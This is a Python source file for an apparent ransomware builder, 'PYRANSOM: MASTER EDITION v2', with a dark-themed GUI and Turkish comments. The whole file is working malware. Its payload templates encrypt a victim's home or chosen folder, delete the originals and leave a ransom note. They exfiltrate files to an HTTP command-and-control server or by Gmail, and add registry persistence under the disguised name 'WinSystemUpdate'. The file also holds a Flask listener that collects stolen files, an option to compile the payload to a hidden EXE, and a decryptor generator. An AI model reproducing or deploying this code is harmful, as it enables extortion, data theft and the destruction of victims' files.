import tkinter as tk
from tkinter import ttk, messagebox, scrolledtext
import threading
import os
import socket
import sys
import subprocess
import shutil
from flask import Flask, request, jsonify
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization
import logging

# --- LOG AYARLARI ---
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

app_flask = Flask(__name__)
SERVER_THREAD = None
UPLOAD_FOLDER = 'calinan_veriler'

# ==============================================================================
# 1. TEMPLATE: HTTP MODE (FLASK C2) - TARGET UPDATE
# ==============================================================================
TEMPLATE_HTTP = r"""
import os, socket, platform, requests, concurrent.futures, threading, sys, shutil, time
import winreg as reg
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.asymmetric import padding

C2_URL = "<<C2_URL>>"
TARGET_TYPE = "<<TARGET_TYPE>>" # 'HOME' veya 'CUSTOM'
CUSTOM_PATH = r"<<CUSTOM_PATH>>"
UZANTI = "<<UZANTI>>"
FIDYE_NOTU = """ + 'r"""<<FIDYE_NOTU>>"""' + r"""
PUBLIC_KEY_STR = b""<<PUBLIC_KEY>>""
PERSISTENCE = <<PERSISTENCE_BOOL>>
APP_NAME = "WinSystemUpdate"

class MalwareHTTP:
    def __init__(self):
        self.aes_key = Fernet.generate_key()
        self.hostname = socket.gethostname()
        self.target_dir = self.get_target_dir()

    def get_target_dir(self):
        # Hedef klasörü dinamik belirle
        if TARGET_TYPE == "HOME":
            return os.path.expanduser("~") # C:\Users\User veya /home/user
        else:
            return CUSTOM_PATH

    def persistence(self):
        if not PERSISTENCE or platform.system() != "Windows": return
        try:
            dest = os.path.join(os.environ["appdata"], self.APP_NAME + ".exe")
            if getattr(sys, 'frozen', False): curr = sys.executable
            else: curr = os.path.abspath(__file__)
            if curr != dest and not os.path.exists(dest): shutil.copyfile(curr, dest)
            key = reg.OpenKey(reg.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, reg.KEY_ALL_ACCESS)
            reg.SetValueEx(key, self.APP_NAME, 0, reg.REG_SZ, dest)
            reg.CloseKey(key)
        except: pass

    def register(self):
        try: requests.post(f"{C2_URL}/api/register", json={"hostname": self.hostname}, timeout=5)
        except: pass

    def steal(self, path):
        try:
            if path.endswith(('.txt','.docx','.pdf','.jpg')) and os.path.getsize(path) < 5000000:
                with open(path, 'rb') as f: requests.post(f"{C2_URL}/api/upload", files={'file': f}, data={"hostname": self.hostname}, timeout=10)
        except: pass

    def lock_key(self):
        try:
            pub = serialization.load_pem_public_key(PUBLIC_KEY_STR)
            enc = pub.encrypt(self.aes_key, padding.OAEP(padding.MGF1(hashes.SHA256()), hashes.SHA256(), None))
            with open(os.path.join(self.target_dir, "SIFRELI_ANAHTAR.bin"), "wb") as f: f.write(enc)
        except: pass

    def process(self, path):
        if path.endswith(UZANTI) or "SIFRELI_ANAHTAR" in path or "payload" in path: return
        self.steal(path)
        try:
            f = Fernet(self.aes_key)
            with open(path, "rb") as file: data = file.read()
            with open(path + UZANTI, "wb") as file: file.write(f.encrypt(data))
            os.remove(path)
        except: pass

    def run(self):
        self.persistence()
        self.register()
        targets = []
        for root, _, files in os.walk(self.target_dir):
            for file in files:
                if not file.endswith(UZANTI): targets.append(os.path.join(root, file))
        with concurrent.futures.ThreadPoolExecutor(max_workers=5) as exe: exe.map(self.process, targets)
        self.lock_key()
        # Notu sadece ana dizine bırak (Heryeri kirletmemek için)
        with open(os.path.join(self.target_dir, "READ_ME.txt"), "w") as f: f.write(FIDYE_NOTU)

if __name__ == "__main__":
    MalwareHTTP().run()
"""

# ==============================================================================
# 2. TEMPLATE: EMAIL MODE (SMTP) - TARGET UPDATE
# ==============================================================================
TEMPLATE_MAIL = r"""
import os, socket, platform, smtplib, ssl, sys, shutil, threading, time
from email import encoders
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import winreg as reg
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.asymmetric import padding

SENDER_EMAIL = "<<SENDER_EMAIL>>"
SENDER_PASS = "<<SENDER_PASSWORD>>"
RECEIVER_EMAIL = "<<RECEIVER_EMAIL>>"
TARGET_TYPE = "<<TARGET_TYPE>>"
CUSTOM_PATH = r"<<CUSTOM_PATH>>"
UZANTI = "<<UZANTI>>"
FIDYE_NOTU = """ + 'r"""<<FIDYE_NOTU>>"""' + r"""
PUBLIC_KEY_STR = b""<<PUBLIC_KEY>>""
PERSISTENCE = <<PERSISTENCE_BOOL>>
APP_NAME = "WinSystemUpdate"

class MalwareMail:
    def __init__(self):
        self.aes_key = Fernet.generate_key()
        self.hostname = socket.gethostname()
        self.target_dir = os.path.expanduser("~") if TARGET_TYPE == "HOME" else CUSTOM_PATH

    def persistence(self):
        if not PERSISTENCE or platform.system() != "Windows": return
        try:
            dest = os.path.join(os.environ["appdata"], self.APP_NAME + ".exe")
            if getattr(sys, 'frozen', False): curr = sys.executable
            else: curr = os.path.abspath(__file__)
            if curr != dest and not os.path.exists(dest): shutil.copyfile(curr, dest)
            key = reg.OpenKey(reg.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, reg.KEY_ALL_ACCESS)
            reg.SetValueEx(key, self.APP_NAME, 0, reg.REG_SZ, dest)
            reg.CloseKey(key)
        except: pass

    def send_mail(self, subject, body, attachment=None):
        try:
            msg = MIMEMultipart()
            msg["From"], msg["To"], msg["Subject"] = SENDER_EMAIL, RECEIVER_EMAIL, f"{subject} - {self.hostname}"
            msg.attach(MIMEText(body, "plain"))
            if attachment and os.path.exists(attachment):
                with open(attachment, "rb") as f:
                    part = MIMEBase("application", "octet-stream")
                    part.set_payload(f.read())
                encoders.encode_base64(part)
                part.add_header("Content-Disposition", f"attachment; filename= {os.path.basename(attachment)}")
                msg.attach(part)
            ctx = ssl.create_default_context()
            with smtplib.SMTP("smtp.gmail.com", 587) as server:
                server.starttls(context=ctx)
                server.login(SENDER_EMAIL, SENDER_PASS)
                server.sendmail(SENDER_EMAIL, RECEIVER_EMAIL, msg.as_string())
        except: pass

    def lock_key(self):
        try:
            pub = serialization.load_pem_public_key(PUBLIC_KEY_STR)
            enc = pub.encrypt(self.aes_key, padding.OAEP(padding.MGF1(hashes.SHA256()), hashes.SHA256(), None))
            key_path = os.path.join(self.target_dir, "SIFRELI_ANAHTAR.bin")
            with open(key_path, "wb") as f: f.write(enc)
            self.send_mail("[KEY] New Victim", f"Key attached for {self.hostname}", key_path)
        except: pass

    def process(self, path):
        if path.endswith(UZANTI) or "SIFRELI_ANAHTAR" in path or "payload" in path: return
        if "gizli" in os.path.basename(path).lower():
            self.send_mail(f"[DATA] Stolen: {os.path.basename(path)}", "File stolen.", path)
        try:
            f = Fernet(self.aes_key)
            with open(path, "rb") as file: data = file.read()
            with open(path + UZANTI, "wb") as file: file.write(f.encrypt(data))
            os.remove(path)
        except: pass

    def run(self):
        self.persistence()
        self.send_mail("[INFO] Infected", f"OS: {platform.system()}")
        targets = []
        for root, _, files in os.walk(self.target_dir):
            for file in files:
                if not file.endswith(UZANTI): targets.append(os.path.join(root, file))
        for t in targets: self.process(t)
        self.lock_key()
        with open(os.path.join(self.target_dir, "READ_ME.txt"), "w") as f: f.write(FIDYE_NOTU)

if __name__ == "__main__":
    MalwareMail().run()
"""

# ==============================================================================
# 3. TEMPLATE: DECRYPTOR - TARGET UPDATE
# ==============================================================================
TEMPLATE_DECRYPTOR = r"""
import os
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.asymmetric import padding

TARGET_TYPE = "<<TARGET_TYPE>>"
CUSTOM_PATH = r"<<CUSTOM_PATH>>"
UZANTI = "<<UZANTI>>"
PRIVATE_KEY_FILE = "private.pem"

# Hedefi Belirle
if TARGET_TYPE == "HOME":
    HEDEF_KLASOR = os.path.expanduser("~")
else:
    HEDEF_KLASOR = CUSTOM_PATH

SIFRELI_ANAHTAR_FILE = os.path.join(HEDEF_KLASOR, "SIFRELI_ANAHTAR.bin")

def run():
    print(f"--- DECRYPTOR (Target: {HEDEF_KLASOR}) ---")
    
    # Private Key'i Ara (Önce çalışılan yerde, sonra hedefte)
    pk_path = PRIVATE_KEY_FILE
    if not os.path.exists(pk_path):
        print(f"[-] '{pk_path}' bulunamadı. Lütfen anahtar dosyasını bu klasöre koyun.")
        input("Enter...")
        return

    if not os.path.exists(SIFRELI_ANAHTAR_FILE):
        print(f"[-] '{SIFRELI_ANAHTAR_FILE}' bulunamadı.")
        input("Enter...")
        return

    try:
        with open(pk_path, "rb") as k: priv = serialization.load_pem_private_key(k.read(), None)
        with open(SIFRELI_ANAHTAR_FILE, "rb") as f: enc = f.read()
        aes = priv.decrypt(enc, padding.OAEP(padding.MGF1(hashes.SHA256()), hashes.SHA256(), None))
    except Exception as e:
        print(f"[-] Key Error: {e}")
        return
    
    fernet = Fernet(aes)
    count = 0
    for root, _, files in os.walk(HEDEF_KLASOR):
        for file in files:
            if file.endswith(UZANTI):
                try:
                    full = os.path.join(root, file)
                    with open(full, "rb") as f: data = f.read()
                    with open(full[:-len(UZANTI)], "wb") as f: f.write(fernet.decrypt(data))
                    os.remove(full)
                    print(f"[+] Decrypted: {file}")
                    count += 1
                except: pass
    print(f"[+] DONE. {count} files recovered.")
    if os.path.exists(SIFRELI_ANAHTAR_FILE): os.remove(SIFRELI_ANAHTAR_FILE)
    input("Enter...")

if __name__ == "__main__":
    run()
"""

# ==============================================================================
# 4. MASTER GUI
# ==============================================================================
class MasterBuilder:
    def __init__(self, root):
        self.root = root
        self.root.title("PYRANSOM: MASTER EDITION v2 (UX Upgrade)")
        self.root.geometry("1100x850")
        
        # Renkler
        self.BG_DARK = "#1a1a1a"
        self.BG_DARKER = "#121212"
        self.TEXT_WHITE = "#e0e0e0"
        self.TEXT_ACCENT = "#00ffff"
        self.BTN_BG = "#252525"
        self.BTN_FG = "#00ff00"
        
        self.root.configure(bg=self.BG_DARK)
        self.setup_styles()
        self.setup_ui()

    def setup_styles(self):
        style = ttk.Style()
        style.theme_use('clam')
        
        style.configure("TFrame", background=self.BG_DARK)
        style.configure("TLabel", background=self.BG_DARK, foreground=self.TEXT_WHITE, font=("Segoe UI", 10))
        style.configure("Accent.TLabel", background=self.BG_DARK, foreground=self.TEXT_ACCENT, font=("Segoe UI", 10, "bold"))
        
        style.configure("TButton", background=self.BTN_BG, foreground=self.BTN_FG, font=("Segoe UI", 10, "bold"), borderwidth=1)
        style.map("TButton", background=[('active', '#333')])
        
        style.configure("TRadiobutton", background=self.BG_DARK, foreground=self.TEXT_WHITE, font=("Segoe UI", 10))
        style.map("TRadiobutton", background=[('active', self.BG_DARK)], indicatorcolor=[('selected', self.BTN_FG)])
        
        style.configure("TCheckbutton", background=self.BG_DARK, foreground=self.TEXT_WHITE, font=("Segoe UI", 10))
        
        style.configure("TLabelframe", background=self.BG_DARK, foreground=self.TEXT_ACCENT, borderwidth=1, relief="solid")
        style.configure("TLabelframe.Label", background=self.BG_DARK, foreground=self.TEXT_ACCENT, font=("Segoe UI", 9, "bold"))

        style.configure("TNotebook", background=self.BG_DARK, borderwidth=0)
        style.configure("TNotebook.Tab", background=self.BG_DARKER, foreground="#888", padding=[20, 10])
        style.map("TNotebook.Tab", background=[('selected', self.BG_DARK)], foreground=[('selected', self.BTN_FG)])

    def setup_ui(self):
        main = ttk.Frame(self.root, padding=20)
        main.pack(expand=True, fill="both")

        notebook = ttk.Notebook(main)
        notebook.pack(expand=True, fill="both")

        self.tab_build = ttk.Frame(notebook)
        self.tab_c2 = ttk.Frame(notebook)
        
        notebook.add(self.tab_build, text=" 🛠️ WEAPON BUILDER ")
        notebook.add(self.tab_c2, text=" 📡 C2 LISTENER ")

        self.setup_builder_tab()
        self.setup_c2_tab()
        
        # İmza
        ttk.Label(self.root, text="by Macallan", foreground="#555", font=("Segoe UI", 8)).pack(side="bottom", pady=10)

    def setup_builder_tab(self):
        frame = ttk.Frame(self.tab_build, padding=20)
        frame.pack(fill="both", expand=True)

        # 1. PROTOCOL SECTION
        proto_group = ttk.LabelFrame(frame, text=" [1] COMMUNICATION PROTOCOL ", padding=15)
        proto_group.pack(fill="x", pady=(0, 15))
        
        self.var_proto = tk.StringVar(value="HTTP")
        pf = ttk.Frame(proto_group)
        pf.pack(fill="x")
        ttk.Radiobutton(pf, text="HTTP C2 (Flask Server)", variable=self.var_proto, value="HTTP", command=self.refresh_config).pack(side="left", padx=(0, 20))
        ttk.Radiobutton(pf, text="EMAIL (SMTP / Gmail)", variable=self.var_proto, value="EMAIL", command=self.refresh_config).pack(side="left")
        
        self.config_area = tk.Frame(proto_group, bg=self.BG_DARKER, bd=0)
        self.config_area.pack(fill="x", pady=(10, 0))
        self.refresh_config()

        # 2. TARGET & SCOPE SECTION (YENİLENEN KISIM)
        target_group = ttk.LabelFrame(frame, text=" [2] TARGET & SCOPE ", padding=15)
        target_group.pack(fill="x", pady=(0, 15))

        self.var_target_type = tk.StringVar(value="CUSTOM")
        
        tf_radios = ttk.Frame(target_group)
        tf_radios.pack(fill="x", pady=(0, 10))
        
        # Seçenek 1: Custom Path
        ttk.Radiobutton(tf_radios, text="Specific Folder Path", variable=self.var_target_type, value="CUSTOM", command=self.toggle_path_entry).pack(side="left", padx=(0, 20))
        # Seçenek 2: Home Dir
        ttk.Radiobutton(tf_radios, text="Entire User Profile (Home Dir)", variable=self.var_target_type, value="HOME", command=self.toggle_path_entry).pack(side="left")

        # Path Entry
        self.ent_target = tk.Entry(target_group, bg="#252525", fg="white", insertbackground="white", relief="flat")
        self.ent_target.insert(0, "test_klasoru")
        self.ent_target.pack(fill="x")

        # 3. ADVANCED & BUILD
        action_group = ttk.Frame(frame)
        action_group.pack(fill="x", pady=10)
        
        # Sol taraf: Checkboxlar
        opts = ttk.Frame(action_group)
        opts.pack(side="left", anchor="n")
        self.var_pers = tk.BooleanVar()
        ttk.Checkbutton(opts, text="Persistence (Registry)", variable=self.var_pers).pack(anchor="w", pady=2)
        self.var_exe = tk.BooleanVar()
        ttk.Checkbutton(opts, text="Compile to .EXE", variable=self.var_exe).pack(anchor="w", pady=2)
        
        # Sağ taraf: Butonlar
        btns = ttk.Frame(action_group)
        btns.pack(side="right", fill="x", expand=True, padx=(20, 0))
        
        ttk.Button(btns, text="☢️ GENERATE PAYLOAD", command=self.build_payload).pack(fill="x", pady=5)
        ttk.Button(btns, text="🔓 GENERATE DECRYPTOR", command=self.build_decryptor).pack(fill="x", pady=5)

    def toggle_path_entry(self):
        if self.var_target_type.get() == "HOME":
            self.ent_target.config(state="disabled", bg=self.BG_DARKER)
        else:
            self.ent_target.config(state="normal", bg="#252525")

    def refresh_config(self):
        for w in self.config_area.winfo_children(): w.destroy()
        
        style_ent = {"bg": "#252525", "fg": "white", "insertbackground": "white", "relief": "flat"}
        
        if self.var_proto.get() == "HTTP":
            f = tk.Frame(self.config_area, bg=self.BG_DARKER, pady=5, padx=5)
            f.pack(fill="x")
            
            l1 = tk.Label(f, text="LHOST (IP):", bg=self.BG_DARKER, fg="#aaa", font=("Segoe UI", 9)); l1.pack(side="left")
            self.ent_ip = tk.Entry(f, **style_ent, width=15); self.ent_ip.insert(0, "127.0.0.1"); self.ent_ip.pack(side="left", padx=5)
            
            l2 = tk.Label(f, text="LPORT:", bg=self.BG_DARKER, fg="#aaa", font=("Segoe UI", 9)); l2.pack(side="left", padx=(10, 0))
            self.ent_port = tk.Entry(f, **style_ent, width=8); self.ent_port.insert(0, "5000"); self.ent_port.pack(side="left", padx=5)
        else:
            f = tk.Frame(self.config_area, bg=self.BG_DARKER, pady=5, padx=5)
            f.pack(fill="x")
            
            tk.Label(f, text="Gmail:", bg=self.BG_DARKER, fg="#aaa").grid(row=0, column=0, sticky="w")
            self.ent_sender = tk.Entry(f, **style_ent, width=25); self.ent_sender.grid(row=0, column=1, padx=5)
            
            tk.Label(f, text="App Pass:", bg=self.BG_DARKER, fg="#aaa").grid(row=0, column=2, sticky="w")
            self.ent_pass = tk.Entry(f, **style_ent, width=20, show="*"); self.ent_pass.grid(row=0, column=3, padx=5)
            
            tk.Label(f, text="To (Email):", bg=self.BG_DARKER, fg="#aaa").grid(row=1, column=0, sticky="w", pady=5)
            self.ent_recv = tk.Entry(f, **style_ent, width=25); self.ent_recv.grid(row=1, column=1, padx=5, pady=5)

    def setup_c2_tab(self):
        frame = ttk.Frame(self.tab_c2, padding=20)
        frame.pack(fill="both", expand=True)
        
        self.btn_start = ttk.Button(frame, text="▶ START HTTP LISTENER", command=self.start_server)
        self.btn_start.pack(fill="x", pady=(0, 10))
        
        self.log_area = scrolledtext.ScrolledText(frame, bg="black", fg="#00ff00", font=("Consolas", 10))
        self.log_area.pack(fill="both", expand=True)
        self.log_area.insert("1.0", "[*] Ready.\n")

    def log(self, msg):
        self.log_area.insert(tk.END, msg + "\n")
        self.log_area.see(tk.END)

    def start_server(self):
        global SERVER_THREAD
        if SERVER_THREAD: return
        if not os.path.exists(UPLOAD_FOLDER): os.makedirs(UPLOAD_FOLDER)
        
        @app_flask.route('/api/register', methods=['POST'])
        def reg():
            self.root.after(0, lambda: self.log(f"[+] NEW VICTIM: {request.json.get('hostname')}"))
            return jsonify({"status":"ok"})

        @app_flask.route('/api/upload', methods=['POST'])
        def up():
            if 'file' in request.files:
                f = request.files['file']
                host = request.form.get('hostname','Unknown')
                f.save(os.path.join(UPLOAD_FOLDER, f"{host}_{f.filename}"))
                self.root.after(0, lambda: self.log(f"[!] EXFILTRATED: {f.filename}"))
            return jsonify({"status":"ok"})

        def run():
            self.root.after(0, lambda: self.log("[*] HTTP Server Listening on 0.0.0.0:5000..."))
            app_flask.run(host='0.0.0.0', port=5000, use_reloader=False)

        SERVER_THREAD = threading.Thread(target=run, daemon=True)
        SERVER_THREAD.start()
        self.btn_start.config(state="disabled", text="LISTENING...")

    def build_payload(self):
        # 1. Anahtar
        priv = rsa.generate_private_key(public_exponent=65537, key_size=2048)
        pem_pub = priv.public_key().public_bytes(serialization.Encoding.PEM, serialization.PublicFormat.SubjectPublicKeyInfo)
        with open("private.pem", "wb") as f: f.write(priv.private_bytes(serialization.Encoding.PEM, serialization.PrivateFormat.PKCS8, serialization.NoEncryption()))

        # 2. Template
        mode = self.var_proto.get()
        if mode == "HTTP":
            code = TEMPLATE_HTTP.replace("<<C2_URL>>", f"http://{self.ent_ip.get()}:{self.ent_port.get()}")
        else:
            code = TEMPLATE_MAIL.replace("<<SENDER_EMAIL>>", self.ent_sender.get()).replace("<<SENDER_PASSWORD>>", self.ent_pass.get()).replace("<<RECEIVER_EMAIL>>", self.ent_recv.get())

        # 3. Target Logic
        target_type = self.var_target_type.get()
        code = code.replace("<<TARGET_TYPE>>", target_type)
        code = code.replace("<<CUSTOM_PATH>>", self.ent_target.get().replace("\\", "\\\\"))
        
        # 4. Common
        code = code.replace("<<UZANTI>>", ".locked")
        code = code.replace("<<FIDYE_NOTU>>", "YOUR FILES ARE ENCRYPTED!")
        code = code.replace('b""<<PUBLIC_KEY>>""', f'b"""{pem_pub.decode("utf-8")}"""')
        code = code.replace("<<PERSISTENCE_BOOL>>", str(self.var_pers.get()))

        fname = "payload.py"
        with open(fname, "w", encoding="utf-8") as f: f.write(code)

        if self.var_exe.get():
            try: subprocess.check_call([sys.executable, '-m', 'PyInstaller', '--onefile', '--noconsole', fname])
            except: messagebox.showerror("Error", "PyInstaller Failed")
            else: messagebox.showinfo("Success", "EXE Created!")
        else:
            messagebox.showinfo("Success", "Payload Created!")

    def build_decryptor(self):
        if not os.path.exists("private.pem"): return
        code = TEMPLATE_DECRYPTOR
        code = code.replace("<<TARGET_TYPE>>", self.var_target_type.get())
        code = code.replace("<<CUSTOM_PATH>>", self.ent_target.get().replace("\\", "\\\\"))
        code = code.replace("<<UZANTI>>", ".locked")
        with open("decryptor.py", "w", encoding="utf-8") as f: f.write(code)
        messagebox.showinfo("Success", "Decryptor Created.")

if __name__ == "__main__":
    root = tk.Tk()
    app = MasterBuilder(root)
    root.mainloop()
